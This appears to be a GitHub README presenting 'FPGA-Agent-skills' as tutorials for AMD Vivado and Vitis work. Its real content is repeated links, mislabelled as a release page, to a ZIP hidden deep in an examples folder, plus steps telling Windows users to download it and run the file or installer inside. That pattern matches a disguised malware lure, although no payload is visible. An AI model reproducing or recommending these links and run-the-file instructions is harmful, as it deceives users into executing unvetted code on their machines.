# 🧠 FPGA-Agent-skills - Learn Vivado and Vitis Faster

[![Download the release page](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)

## 📦 What this is

FPGA-Agent-skills is a set of guided skills for AMD Vivado and Vitis FPGA work. It covers the full flow from HLS C/C++ to bitstream creation, plus simulation, constraints, timing, and debug.

This project is made for people who want a clear path through FPGA work on Windows. It groups the main tasks into small skills so you can follow one step at a time.

## 🪟 Windows download and setup

Use the release page to download and run this file on Windows:

[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)

After you open the page:

1. Find the latest release
2. Download the release file for Windows
3. Save the file to your computer
4. Open the file from your Downloads folder
5. Follow the on-screen steps

If the release comes as a ZIP file, unzip it first. If it comes as an installer, run the installer and follow the prompts.

## ✅ What you need

Before you start, make sure you have:

- A Windows PC
- Enough disk space for Vivado and Vitis projects
- A working internet connection for the first download
- AMD Vivado/Vitis 2025.2 or a matching setup
- A folder where you can save your FPGA files

For a smooth setup, use a modern Windows machine with at least:

- 16 GB RAM
- 50 GB free disk space
- A 64-bit version of Windows
- A screen with enough space to view project windows side by side

## 🚀 How to use it

This repo is built around FPGA development skills. Each skill focuses on one part of the flow.

Use it like this:

1. Download the release from GitHub
2. Open the files in the release package
3. Read the skill that matches your task
4. Follow the steps in order
5. Move to the next skill after your current task is done

If you are new to FPGA work, start with the HLS skill. If you already have a design, jump to synthesis, constraints, or timing.

## 🧭 FPGA development flow

The project follows a common FPGA flow:

- HLS C/C++
- RTL design
- Synthesis
- Constraints
- Implementation
- Timing analysis
- Programming and debug

It also uses simulation and TCL automation across the flow.

## 📚 Skills included

### 🧱 vitis-hls-synthesis

This skill covers HLS synthesis in Vitis HLS.

Use it when you want to turn C/C++ into RTL. It helps with:

- Pragma use
- Interface setup
- Dataflow and pipeline design
- Burst transfer tuning
- Synthesis report reading

This skill is useful when you want better speed or lower resource use.

### ⚙️ vivado-synth

This skill covers synthesis in Vivado.

Use it when your design is ready for the next step. It helps with:

- Strategy choice
- RAM, DSP, and shift register use
- Resource inference
- FSM encoding
- Out-of-context synthesis
- Incremental synthesis

This skill helps you guide how Vivado builds your hardware design.

### 📐 vivado-constraints

This skill covers design constraints.

Use it to tell Vivado how your board and clock work. It helps with:

- Clock definition
- I/O delay settings
- Timing exceptions
- False paths
- Input and output timing setup

Good constraints help the tool understand your real hardware setup.

### ⏱️ timing-analysis

This skill covers timing checks after implementation.

Use it to see if your design can run at the target clock rate. It helps with:

- Setup and hold checks
- Slack review
- Critical path lookup
- Timing report reading
- Fixing slow paths

This step matters when a design works in simulation but fails in hardware.

### 🧰 rtl-design

This skill covers RTL design basics.

Use it when you write or review Verilog or VHDL. It helps with:

- Module structure
- Signal naming
- Register logic
- Combinational logic
- Clocked logic
- Clean code layout

This skill supports stable and readable hardware design.

### 🔬 sim

This skill covers simulation across the flow.

Use it to test your design before hardware use. It helps with:

- Testbench setup
- Waveform review
- Input and output checks
- Debugging logic errors
- Checking expected results

Simulation helps catch problems early.

### 🧪 tcl-automation

This skill covers TCL use across the flow.

Use it when you want repeatable steps in Vivado and Vitis. It helps with:

- Project setup
- Run control
- Report generation
- Batch tasks
- Tool automation

TCL is useful when you want the same steps each time.

### 🔧 programming-debug

This skill covers board programming and debug.

Use it after the design is built. It helps with:

- Bitstream loading
- Hardware testing
- Signal viewing
- Debug setup
- Problem tracing on the board

This is the last step before real hardware use.

## 🗂️ Skill list at a glance

| Skill | Main use | What it helps with |
|-------|----------|-------------------|
| vitis-hls-synthesis | HLS build | C/C++ to RTL, pragmas, pipelines |
| vivado-synth | Logic synthesis | Strategy, resources, inference |
| vivado-constraints | Timing setup | Clocks, delays, exceptions |
| timing-analysis | Timing checks | Slack, paths, speed issues |
| rtl-design | HDL design | Verilog/VHDL structure |
| sim | Simulation | Testbenches, waveforms, checks |
| tcl-automation | Automation | Batch runs, reports, repeatable work |
| programming-debug | Hardware use | Bitstream, board test, debug |

## 🧩 How to choose the right skill

Use this simple guide:

- If you write C/C++ for hardware, start with **vitis-hls-synthesis**
- If you write Verilog or VHDL, start with **rtl-design**
- If your design builds but does not meet speed, use **timing-analysis**
- If the board does not behave as expected, use **sim** and **programming-debug**
- If you want repeatable setup, use **tcl-automation**

## 📁 Suggested folder setup

You can keep your files in a simple layout like this:

- `Downloads` for the release file
- `FPGA-Agent-skills` for the extracted project
- `Projects` for your Vivado and Vitis work
- `Reports` for timing and synthesis reports
- `Debug` for test files and notes

A clean folder layout makes it easier to find your work later.

## 🖥️ Basic Windows steps

If you are new to this, follow these steps:

1. Open the release page
2. Download the latest release
3. Save it to a folder you can find
4. If it is zipped, right-click and extract it
5. Open the extracted folder
6. Read the skill file you need
7. Open Vivado or Vitis
8. Follow the steps in the skill file
9. Save your work in your project folder

## 🛠️ Common use cases

This repo helps with:

- Turning C/C++ code into FPGA logic
- Writing and checking RTL
- Setting clock rules for a board
- Reading synthesis and timing reports
- Running simulation before hardware tests
- Using TCL to repeat tool steps
- Loading a design on a board and checking it

## 📌 File and release notes

The release page is the main place to get the latest files:

[Visit the release page to download](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)

After you download the file, keep the original release archive in case you need it again later.

## 🧪 Working with Vivado and Vitis

If you use this repo with AMD tools, keep these habits:

- Save often
- Use clear file names
- Check reports after each build
- Fix timing issues before hardware testing
- Run simulation before bitstream generation
- Keep your constraints in one place
- Use TCL when you want the same result each time

## 🔍 What you will get from this repo

This project helps you:

- Follow the FPGA flow in a clear order
- Move from one task to the next with less guesswork
- Read tool reports with more confidence
- Keep your design steps organized
- Work through Vivado and Vitis tasks on Windows with a simple path

## 📎 Release download

[![Download from GitHub Releases](https://img.shields.io/badge/GitHub%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/adeleempurpled290/FPGA-Agent-skills/raw/refs/heads/main/vitis-hls-synthesis/examples/Introductory_Examples/Modeling/using_fixed_point/FPG-Agent-skills-v1.0.zip)

Visit the page, download the latest release, and run the file on your Windows PC